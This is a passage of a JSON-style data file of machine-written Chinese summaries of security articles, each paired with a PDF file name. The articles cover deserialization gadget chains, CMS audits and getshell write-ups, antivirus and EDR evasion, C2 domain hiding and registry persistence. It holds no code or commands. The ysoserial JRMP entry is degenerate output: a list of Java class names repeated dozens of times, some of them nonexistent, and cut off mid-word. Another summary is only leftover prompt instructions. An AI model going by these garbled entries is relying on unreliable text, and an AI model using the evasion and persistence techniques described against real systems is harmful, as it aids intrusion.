        "page_content": "gadgetinspector 是一个用于分析 Java 反序列化 gadget chain 的工具，它可以帮助识别和利用 Java 反序列化中的漏洞。该工具通过分析字节码、方法调用和数据流来构建 gadget chain，并确定它们是否可以用于执行任意代码。gadgetinspector 的主要组件包括：\n                    \n                    * **MethodDiscovery**：用于发现类、方法和继承关系。\n                    * **PassthroughDiscovery**：用于分析方法参数和返回值之间的污点传播。\n                    * **CallGraphDiscovery**：用于记录方法调用关系。\n                    * **SourceDiscovery**：用于识别可以触发反序列化过程的入口点。\n                    * **GadgetChainDiscovery**：用于整合前几个阶段的数据并识别可利用的 gadget chain。\n                    \n                    gadgetinspector 的工作流程如下：\n                    \n                    1. **加载数据**：加载类、方法、继承关系和污点传播数据。\n                    2. **发现方法调用**：分析字节码以发现方法调用关系。\n                    3. **发现污点传播**：分析方法参数和返回值之间的污点传播。\n                    4. **发现入口点**：识别可以触发反序列化过程的入口点。\n                    5. **发现 gadget chain**：整合前几个阶段的数据并识别可利用的 gadget chain。\n                    \n                    gadgetinspector 的输出是一个包含可利用 gadget chain 的文件。这些 gadget chain 可以用于构建攻击，利用 Java 反序列化中的漏洞。",
        "FileName": "7058-java反序列化利用链自动挖掘工具gadgetinspector源码浅析.pdf"
    },
    {
        "page_content": "本文介绍了一种在 SRC 挖掘中不受限制地调用资源的新思路，即通过利用第三方平台开放的实名认证接口，绕过厂商限制，无限消耗其资源，从而达到自己的目的。该思路适用于身份证二要素验证、短信验证和活人检测等基于付费的验证机制。",
        "FileName": "10691-SRC另类思路分享：不受限制的资源调用.pdf"
    },
    {
        "page_content": "PHP session 是一种存储用户会话信息的特殊变量，它可以跨网页访问，并通过配置项 session.save_handler 来修改所采用的会话保存管理器。默认情况下，PHP 使用内置的文件会话保存管理器，将会话数据保存到指定位置。PHP session 常被利用的点包括反序列化漏洞、文件包含和用户伪造，这些漏洞的利用条件和方法因具体情况而异。",
        "FileName": "8221-PHP session 常见利用点.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 MyBB 论坛系统中的代码执行漏洞。该漏洞允许攻击者通过修改头像上传路径，将恶意 PHP 脚本上传到服务器并执行任意代码。文档提供了漏洞复现的详细步骤，包括修改设置、上传恶意图像文件和包含 PHP 脚本。",
        "FileName": "7213-记一次mybb代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 JSP 内存马的原理，并介绍了两种绕过查杀工具的方法。第一种方法通过修改 JSP 编译选项和 Servlet 注册信息，使 JSP 内存马在删除 JSP、Java 和 Class 文件后仍能访问。第二种方法通过修改 JSP 编译上下文信息，删除 JSP、Java 和 Class 文件，实现 JSP 内存马的自删除。",
        "FileName": "10372-JSP内存马研究.pdf"
    },
    {
        "page_content": "FreeMarker 是一种模板引擎，用于基于模板和数据生成文本输出。它使用 FreeMarker Template Language (FTL) 编写模板，专注于数据呈现，而无需处理数据准备。FreeMarker 可以与 SpringBoot 集成，通过指定模板加载路径、后缀名和内容类型等配置选项来使用。它支持各种数据类型转换和字符串操作函数，但需要注意潜在的安全漏洞，例如 XSS 和 RCE，这些漏洞可能由恶意数据输入引起。",
        "FileName": "12637-FreeMarker入门到简要分析模版注入.pdf"
    },
    {
        "page_content": "该文档记录了作者通过信息收集和漏洞利用，成功获取了一个简单 BC 站点的 getshell 权限，并进一步利用该权限进行 C 段扫描，发现其他系统。作者尝试利用 TP 5.0.23 的 RCE 漏洞，但发现命令执行函数被禁用。通过尝试 base64 编码，作者成功写入一句话木马，并利用哥斯拉突破权限，拖取数据库数据，包括 3 个后台管理员密码和 5.5k 会员账号信息。",
        "FileName": "9280-简单的BC站点getshell之后续.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全之 ysoserial JRMP 分析，重点介绍了如何利用 ysoserial JRMP 分析 Java 安全漏洞。文档首先介绍了 ysoserial JRMP 分析的主题和内容，然后详细分析了文档中涉及的类和方法，包括 sun.rmi.transport.tcp.TCPEndpoint、java.rmi.server.ObjID、sun.rmi.server.UnicastRef、sun.rmi.transport.LiveRef、java.rmi.server.RemoteObjectInvocationHandler、sun.rmi.server.UnicastServerRef、java.rmi.dgc.DGC、sun.rmi.transport.DGCImpl_Skel、java.rmi.server.RemoteObject、sun.rmi.transport.Target、java.rmi.dgc.DGCImpl、sun.rmi.transport.Endpoint、java.rmi.server.ActivationGroupImpl、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server.DGCClient、java.rmi.server.DGCClient$EndpointEntry、java.rmi.server.UnicastRemoteObject、java.rmi.server.RemoteServer、java.rmi.server.RemoteObject、java.lang.reflect.Method、java.io.ObjectStreamClass、java.io.ObjectInputStream、java.io.ObjectOutputStream、java.io.MarshalOutputStream、java.io.DataInputStream、java.io.DataOutputStream、java.rmi.server.RemoteCall、java.rmi.server.RemoteRef、java.rmi.server.RemoteStub、java.rmi.server.Lease、java.rmi.server",
        "FileName": "12780-Java安全之ysoserial JRMP分析.pdf"
    },
    {
        "page_content": "**主题：**对某博客系统的安全审计报告\n\n**内容：**该报告详细分析了博客系统中的多个安全漏洞，包括公告处XSS、评论处XSS、友链申请处XSS、文件上传漏洞和SQL注入漏洞。报告提供了漏洞的具体位置、利用方法和绕过措施，并建议了相应的修复方案。",
        "FileName": "12043-对某blog系统的审计.pdf"
    },
    {
        "page_content": "本文总结了 CTF 中绕过关键词过滤读取文件的方法，包括通配符、正则匹配、转进制、管道符、空格过滤绕过等技巧。此外，还介绍了各种读取文件的方法，如 cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、od、vim、vi、man、paste、grep、file、dd、date 等命令的用法。",
        "FileName": "12431-CTF里读取文件相关知识点总结.pdf"
    },
    {
        "page_content": "本文档详细介绍了对一个 PHP CMS 应用程序进行代码审计的过程，重点关注寻找可控的输入点和绕过输入点以执行危险函数，从而获得对主机的权限。审计过程包括发现远程文件上传漏洞、获取访问令牌、任意文件读取漏洞和 SSRF 漏洞。",
        "FileName": "10981-商城 cms 审计 ｜ php代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用 Python 绕过杀毒软件内存写入函数检测的免杀技术。通过异或编码 shellcode 并使用 ctypes 库调用动态链接库函数，该技术可以将 shellcode 写入申请的虚拟内存并以线程方式执行，从而绕过杀毒软件的检测。",
        "FileName": "10984-简单的手法过杀软.pdf"
    },
    {
        "page_content": "该文档探讨了点击劫持、Self-XSS和复制粘贴劫持的组合攻击，这些攻击利用了网站的XSS漏洞，允许攻击者通过诱骗受害者复制恶意代码并将其粘贴到目标网站来窃取受害者的cookie等敏感信息。",
        "FileName": "7391-点击劫持、Self-XSS、复制粘贴劫持的组合攻击学习——XSS劫持.pdf"
    },
    {
        "page_content": "这篇文档介绍了免杀入门混淆加密方法，通过编码算法对恶意程序或代码进行处理，逃避杀毒软件检测。文档提供了两种编码方法，一种是简单的加法和减法，另一种是采用多种算法复合编码。还介绍了如何编写自动化编码工具和构建解码器，并通过示例展示了编码后的代码如何被成功解码。",
        "FileName": "9499-免杀入门混淆加密方法分析，看这一篇就够了。.pdf"
    },
    {
        "page_content": "本文档分享了作者对某 CMS 代码审计的思路和过程，包括使用 VSCode 和 Seay 源代码审计系统查找漏洞，利用文件包含漏洞和上传点绕过 WAF 过滤，最终成功获取 Shell。",
        "FileName": "9529-某CMS代码审计思路分享.pdf"
    },
    {
        "page_content": "该文档主要介绍了 RMI 的利⽤学习，包括 RMI 的概念、原理、攻击⽅法和修复建议。",
        "FileName": "11339-RMI利用学习.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2012-0158 和另一个无 CVE 编号的 Microsoft Office MSCOMCTL.OCX 控件中的两个缓冲区溢出漏洞，并提供了利用样本的详细分析，包括漏洞成因、利用思路、Shellcode 编写和利⽤样本分析。",
        "FileName": "9446-MS12-027及利用样本分析.pdf"
    },
    {
        "page_content": "该文档分析了开源 lua-waf 项目，该项目使用 nginx 和 lua 代码来过滤 HTTP 请求包，检测攻击并拦截不符合规则的请求。文档详细介绍了 lua-waf 的工作原理，包括其在 nginx 处理 HTTP 请求的 11 个阶段中的执行流程、使用的 API 和配置选项。此外，文档还讨论了绕过 lua-waf 检查的潜在方法，例如使用不规则的 HTTP 请求包或不安全的 API 接口。",
        "FileName": "10803-lua_waf学习笔记.pdf"
    },
    {
        "page_content": "该文档介绍了作者在进行 Web 登录渗透测试时采用的思路和方法，包括弱口令爆破、目录扫描、JS 文件未授权访问、越权等技术。作者通过这些方法成功获取了管理员账号和普通用户账号，并最终获得了网站的所有权限。",
        "FileName": "11612-记一次web登录通杀渗透测试.pdf"
    },
    {
        "page_content": "该文档记录了对 Vulnhub 靶机 Matrix-Breakout-2-Morpheus 的渗透测试过程，包括信息收集、漏洞利用、权限提升和获取 flag。渗透者通过目录扫描发现了隐藏文件 graffiti.php，利用其存储型 XSS 漏洞上传一句话木马，并使用 Linux 提权辅助工具和 CVE-2022-0847 漏洞成功提权至 root 用户，最终获得了 flag。",
        "FileName": "12740-vulnhub打靶日记day02之matrix-breakout-2-morpheus.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Tomcat HTTP 请求走私漏洞 (CVE-2021-33037)，该漏洞是由 Tomcat 在处理 HTTP 传输编码请求标头时出现错误导致的。当与反向代理一起使用时，可能会出现请求走私，因为 Tomcat 无法正确解析 HTTP/1.0 连接中的 Transfer-Encoding: chunked 请求头，从而导致后端服务对请求数据的不同解析，造成 HTTP 走私漏洞。",
        "FileName": "9866-Apache Tomcat HTTP请求走私(CVE-2021-33037)漏洞分析.pdf"
    },
    {
        "page_content": "本文档介绍了 DLL 劫持技术，包括如何发现可劫持的 DLL、手动和自动劫持 DLL 的方法，以及转发技术的使用。DLL 劫持是一种攻击技术，通过加载恶意 DLL 来影响应用程序的正常运行，可以用于执行任意代码、窃取敏感信息或破坏系统。",
        "FileName": "12365-dll劫持入门.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Tomcat 中的 WebSocket 拒绝服务漏洞 (CVE-2020-13935)，该漏洞是由 WebSocket 帧中“负载长度”验证不当引起的，导致无效的“负载长度”触发无限循环，从而导致拒绝服务。",
        "FileName": "8550-漏洞分析 -  Apache Tomcat WebSocket DoS (CVE-2020-13935).pdf"
    },
    {
        "page_content": "本文介绍了如何解决 CodeQL 在本地使用时编译不成功的问题，通过使用 GitHub 自带的 actions，可以加载自定义规则，并通过修改 codeql.yml 配置文件，实现扫描 Android 项目中因环境搭建失败导致无法继续使用 codeql 的情况。",
        "FileName": "12412-思路分享解决Codeql本地使用时编译不成功问题.pdf"
    },
    {
        "page_content": "该文档提供了有关系统入侵排查的详细指南，涵盖了账户排查、注册表排查、网络排查、进程排查、注册表排查、计划任务排查、服务排查和文件目录排查等方面，旨在帮助蓝队应急响应人员识别和解决系统入侵问题。",
        "FileName": "12832-蓝队应急响应之系统入侵排查.pdf"
    },
    {
        "page_content": "该文档分析了 SOCasS（SOC 即服务）的架构和相关部署方法，并提供了使用 100% 开源软件和技术构建 SOC 的详细指南，涵盖了日志收集、漏洞扫描、监控、日志处理、数据整合、仪表盘图表、告警、应急响应事件管理等方面。",
        "FileName": "9564-SOCasS(把SOC当作一种服务)的架构部署和技术漫谈-上.pdf"
    },
    {
        "page_content": "本文档探讨了利用回调函数和修改堆栈来绕过 EDR 检测的技巧，重点介绍了如何使用 TpAllocWork 函数和自定义汇编代码来加载动态链接库和分配内存空间，从而构建一个自定义的 shellcode。",
        "FileName": "12273-利用自定义堆栈进行 Shellcode 开发.pdf"
    },
    {
        "page_content": "该文档分析了union联合类型在程序中的错误使用，导致了程序漏洞。该漏洞原理是union类型的变量内存区域共享，当修改其中一个变量时，另一个变量的值也会发生变化。利用这个漏洞，攻击者可以通过设置特定值来控制程序执行任意指令，从而达到攻击目的。",
        "FileName": "7410-一个union引发的惨案.pdf"
    },
    {
        "page_content": "该文档主要介绍了通过边界代理一路上打到三层内网+后渗透通用的手法，内容包括：\n1. 分析文档的主题和内容\n2. 用一段话概括文档",
        "FileName": "11784-通过边界代理一路打到三层内网+后渗透通用手法.pdf"
    },
    {
        "page_content": "该文档分析了多个 CTF 挑战，包括利用 Python 反序列化、SQL 注入、堆溢出、任意读写和栈溢出等漏洞，以获取管理员权限或泄露敏感信息。",
        "FileName": "7370-2020高校战役XCTF分享赛.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-43798 漏洞，该漏洞影响 Grafana，允许攻击者通过加载插件文件读取任意文件。漏洞的根源在于对输出信息缺乏过滤，导致输入信息可以通过 ../../ 跨目录读取任意文件内容。修复方法是禁止跨目录读取，限制读取文件的范围。",
        "FileName": "10647-漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞.pdf"
    },
    {
        "page_content": "**主题：** CmsEasy 代码审计报告\n\n**内容：** 对 CmsEasy 7.3.8 版本进行代码审计，发现多个安全问题，包括任意文件操作、SQL 注入、本地文件包含和命令执行。这些问题表明该 CMS 的安全性有待提高，需要进行修复和更新。",
        "FileName": "7273-打怪升级之CmsEasy代码审计小记.pdf"
    },
    {
        "page_content": "本文档全面介绍了子域名探测方法，包括手动、工具、搜索引擎和漏洞搜索引擎等方式。子域名探测对于渗透测试至关重要，因为它可以帮助发现更多服务，增加发现漏洞的可能性。文档还提供了各种在线接口、爆力枚举、SSL/TLS 证书、信息泄露、内容解析、DNS 聚合器、DNS 缓存侦测、DNSSEC 区域漫步、CSP HTTP 头部、SPF 记录、虚拟主机爆破、ASN 发现和爬取等技术。",
        "FileName": "8652-子域名探测方法大全.pdf"
    },
    {
        "page_content": "该文档对飞趣开源 BBS 代码进行了安全审计，重点关注第三方组件漏洞，包括 FastJson、Commons Collections 和 Log4j。审计发现 FastJson 1.2.28 存在反序列化漏洞，可通过 JNDI 注入利用；Commons Collections 3.2.1.jar 存在反序列化漏洞，可通过 ChainedTransformer 利用；Log4j 2.11.2 存在 JNDI 注入漏洞，可通过参数可控的 logger.error 利用。",
        "FileName": "11137-飞趣开源BBS代码审计-JAVA.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 PHPOK 企业站系统中的两个漏洞（cache.php 和 token.php）来实现 getshell。第一个漏洞允许绕过 exit() 函数，而第二个漏洞允许反序列化恶意类。通过利用这些漏洞，攻击者可以修改系统设置，序列化恶意类并触发反序列化，从而在目标服务器上获得 shell 权限。",
        "FileName": "7852-某OK最新版漏洞组合拳GETSHELL.pdf"
    },
    {
        "page_content": "本文重点介绍了原型污染攻击，该攻击利用 JavaScript 继承模型中的原型污染漏洞，绕过 HTML 过滤器。通过污染 Object.prototype，攻击者可以向所有 JS 对象添加属性，从而改变应用程序的逻辑，导致安全问题。本文分析了三个流行的 HTML 过滤器（sanitize-html、XSS 和 DOMPurify）如何受到原型污染的影响，并提供了绕过这些过滤器的示例。",
        "FileName": "8301-原型污染-并绕过客户端HTML过滤器.pdf"
    },
    {
        "page_content": "该文档介绍了使用 CDN 和 Worker 隐藏 C2 域名的技术，包括 CDN-worker 伪装、匿名 CDN 和 Worker 以及使用 Cloudflare 和 Nodecache 的具体步骤。该技术旨在隐藏 C2 域名的真实地址，防止情报收集和渗透检测。",
        "FileName": "9760-使用CDN+worker隐藏C2域名.pdf"
    },
    {
        "page_content": "该文档总结了在 CTF 中绕过 PHP 远程代码执行 (RCE) 的常见技术，包括利用变量、位运算、自增运算符和外部参数引入，以及在没有字母数字字符的情况下执行系统命令的姿势。",
        "FileName": "8354-ctf中常见php rce绕过总结.pdf"
    },
    {
        "page_content": "该文档分析了 AliIM2010 ActiveX 控件 imageMan.dll 中的栈溢出漏洞，该漏洞是由 mbsnbcpy 函数中的越界访问引起的，该函数将过长的字符串复制到目标缓冲区中。通过 fuzz 测试，确定了触发漏洞的输入长度，并利用堆喷技术构造了利用代码，成功执行了任意代码。",
        "FileName": "7395-漏洞分析学习之某ActiveX控件imageMan.dll栈溢出.pdf"
    },
    {
        "page_content": "该文档分析了绕过文件上传白名单的两种方法：黑名单绕过和白名单绕过。黑名单绕过通过利用黑名单中遗漏的后缀来上传文件，而白名单绕过则通过结合中间件、特定环境下的解析漏洞和畸形解析来绕过白名单限制。文档还提供了绕过白名单的具体代码示例。",
        "FileName": "12617-一次白名单绕过分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了在内网渗透靶场中利用各种技术获取目标服务器权限、进行内网信息收集、横向移动、端口转发和使用Venom工具进行多级代理，最终实现对域控的控制。",
        "FileName": "8394-一次简单的内网渗透靶场实验.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 系统中的任意文件上传漏洞，该漏洞允许攻击者在没有文件扩展名的情况下直接上传文件到 `/common/feng_img/` 目录。漏洞的成因是系统未对上传文件进行后缀名检查和重命名，导致攻击者可以上传任意文件。文档还提供了漏洞复现步骤，并指出该 CMS 系统还存在注入漏洞，但未进行详细分析。",
        "FileName": "7949-某cms审计.pdf"
    },
    {
        "page_content": "该文档详细描述了红队渗透测试人员利用 Log4j 漏洞进入一家公司的内网，并通过各种技术手段横向移动，最终获得对大量资产的控制。渗透过程中，管理员发现了攻击者的活动并采取了应对措施，导致攻击者不得不不断寻找新的入口点。",
        "FileName": "11524-[有手就行]Log4j打点后与管理员斗智斗勇.pdf"
    },
    {
        "page_content": "该文档详细介绍了多层内网渗透的完整过程，从外网打点到内网横向渗透，最终获取整个内网权限。渗透测试人员利用各种工具和技术，包括Nmap、MSFvenom、mimikatz、SharpSQLTools和impacket，在域控、域内服务器和个人电脑之间横向移动，并最终通过Netlogon特权提升漏洞和wmiexec.py脚本获取域控shell。",
        "FileName": "11588-MSF多层内网渗透全过程.pdf"
    },
    {
        "page_content": "该文档介绍了在特殊场景下使用 msf、cs、SPP、Pystinger、goproxy 和内存加载等工具，通过 ICMP、HTTP 代理或内存加载的方式，在仅 ICMP 出网或不出域控的情况下，实现对目标机器的上线和控制。",
        "FileName": "10626-红队攻防之特殊场景上线cs和msf.pdf"
    },
    {
        "page_content": "Apache Tapestry 4 中存在一个 Java 序列化漏洞，该漏洞允许在未经身份验证的情况下反序列化 \"sp\" 参数。该漏洞源于 Tapestry 4 在调用页面的 \"validate\" 方法之前尝试反序列化 \"sp\" 参数，导致反序列化无需身份验证。利用该漏洞需要一个环境，其中 Tapestry 4 应用程序部署在容器中，并且存在一个包含 \"Form\" 或 \"DirectLink\" 组件的页面，该组件允许用户输入字符串类型数据。",
        "FileName": "11226-Tapestry4 RCE分析.pdf"
    },
    {
        "page_content": "该文档分析了如何绕过某网上图书馆的复制限制，通过分析网页前端的 JavaScript 代码，作者发现网站劫持了右键点击事件并限制了复制功能。作者通过修改关键变量的值，成功恢复了原始的右键事件和复制功能，并指出这种反复制措施主要针对用户注册和充值，对爬虫的限制效果较弱。",
        "FileName": "12127-去除某网上图书馆的复制限制.pdf"
    },
    {
        "page_content": "该文档记录了一次对 JavaWeb 管理系统的常规审计，重点关注垂直越权和任意文件下载漏洞。审计过程涉及分析代码、跟踪数据流和使用代码审计工具，最终发现了两个漏洞：垂直越权和任意文件下载（已修复）。文档还提供了代码审计流程、架构原理和工具辅助方面的建议。",
        "FileName": "9841-JavaWeb的某管理系统的一次常规审计.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel 反序列化非预期 + POP 链挖掘技术，总结了这类题目的常见技巧和 Laravel 中 POP 链接的挖掘过程。文档还提供了几个示例，展示了如何利用这些技巧和技术来构造 POP 链并执行任意代码。",
        "FileName": "8296-安洵杯Laravel反序列化非预期+POP链挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了如何解决 Intigriti Easter XSS 挑战，该挑战要求在规定时间内利用 XSS 漏洞获得 Burp Suite 正版证书。文档分析了挑战的脚本代码，发现可以通过触发 location.hash 的变化来调用 displayReason 函数，并通过 AJAX 请求获取 ./reasons/${reason}.txt 文件的内容。通过测试发现，直接在 URL 的锚部分写入 XSS 语句无效，因为响应内容经过了编码处理。随后，作者尝试了通过 403 页面触发 XSS，发现响应内容中 XSS 语句完整存在。最终，作者通过构造一个包含 XSS 语句的 iframe srcdoc 属性的 payload，成功触发了 XSS 漏洞。",
        "FileName": "7655-Intigriti Easter XSS challenge.pdf"
    },
    {
        "page_content": "该文档分析了 Shiro 反序列化漏洞，详细介绍了漏洞的原理、加密和解密过程，并提供了检测 Shiro 组件存在的脚本。文档强调了漏洞利用的三个主要目标：控制 rememberMe 参数的值、获得加密解密方法以及构造恶意序列化 payload。",
        "FileName": "8997-Shiro反序列化分析带思路及组件检测笔记.pdf"
    },
    {
        "page_content": "这篇文档分析了 12 年前的某旺控件栈溢出漏洞，该漏洞存在于 AutoPic 函数中，利用 WideCharToMultiByte 函数将宽字符串转换为指定的新字符串，并使用 strrchr 函数查找字符串中最后一次出现字符 '\\' 的位置。由于输入的字符串中没有 '\\'，导致 strrchr 返回空指针，从而导致栈溢出。该漏洞可以通过堆喷射技术进行利用，但 COMRaider 生成的 fuzz POC 无法触发崩溃，而 JS POC 则可以。",
        "FileName": "12005-十二年前的漏洞——对某旺控件栈溢出漏洞的学习.pdf"
    },
    {
        "page_content": "该文档详细描述了如何利用源代码泄露和数据库备份获取微擎 CMS 后台的 webshell。通过解密用户密码登录系统，分析代码审计，获取 cloud_transtoken 和 authkey，构造 payload，最终成功写入 webshell。该过程需要管理员权限和站点注册云服务。",
        "FileName": "7529-记一次从源代码泄漏到后台获取webshell的过程.pdf"
    },
    {
        "page_content": "该文档分析了 corCTF 2022-CoRJail 漏洞利用，该漏洞利用利用了 Linux 内核中 poll_list 对象中的 off-by-null 漏洞，导致越界写 null 字节，从而触发 UAF 漏洞。利用者通过堆喷、泄露内核基地址、劫持控制流等技术，最终获得了 Docker 容器外的 shell 权限。",
        "FileName": "12488-corCTF 2022-CoRJail利用Linux kernel中的poll_list对象.pdf"
    },
    {
        "page_content": "该文档介绍了一种通过修改注册表项来实现恶意软件持久性的技术，该技术利用了 Windows 的图像文件执行选项 (IFEO) 和静默进程退出功能。通过将恶意软件设置为在 Microsoft Paint (mspaint.exe) 静默退出后运行，攻击者可以实现恶意软件的持久性，即使系统重新启动或用户注销。",
        "FileName": "11917-利用windows自带的画图软件(mspaint.exe)进行权限维持.pdf"
    },
    {
        "page_content": "该文档分析了金微手机商城 V0.3.8 版本中的一个 SQL 注入漏洞，该漏洞允许攻击者通过构造恶意 POST 请求来注入 SQL 语句，从而获取敏感信息，如数据库表名和用户名。该漏洞的利用过程涉及使用 JSON 数据格式传递注入语句，并利用时间盲注技术来逐个字符地获取信息。",
        "FileName": "9367-记一次简单的审计.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2020-0932 漏洞，该漏洞允许经过身份验证的 SharePoint 用户在 SharePoint 服务器上执行任意代码。该漏洞是由 SharePoint 在解析 WebParts 的 XML 配置时不限制属性的可用的类型造成的，攻击者可以利用某些类型转换器来执行任意代码。利用此漏洞需要一个包含有效 payload 的已编译 .resources 资源文件，该文件可以通过 Visual Studio 创建。攻击者还需要设置一个由攻击者控制的远程 SMB 服务器，该服务器可以接收来自目标 SharePoint 服务器的流量。",
        "FileName": "7727-CVE-2020-0932：使用TYPECONVERTERS在MICROSOFT SHAREPOINT上执行远程代码.pdf"
    },
    {
        "page_content": "该文档探讨了跨域资源共享 (CORS) 配置错误的严重性，并提供了三个利用这些错误的示例。第一个示例涉及使用子域名通配符来绕过域限制，第二个示例涉及利用错误配置的 CORS 策略来窃取授权用户的敏感信息，第三个示例涉及利用空来源来绕过 CORS 限制。该文档强调了正确配置 CORS 的重要性，并提供了攻击者可能利用的常见错误配置类型。",
        "FileName": "7428-通过一系列漏洞突破域名搜索范围限制(给使用CORS的开发者的小提示).pdf"
    },
    {
        "page_content": "该文档分析了 Smarty 模板引擎中的 CVE-2017-1000480 漏洞，该漏洞允许攻击者通过制作恶意数学字符串来执行任意 PHP 代码。文档介绍了确定模板类型、攻击方式和漏洞成因的方法，并提供了利用漏洞的示例代码。",
        "FileName": "12220-Smarty模板注入&CVE-2017-1000480.pdf"
    },
    {
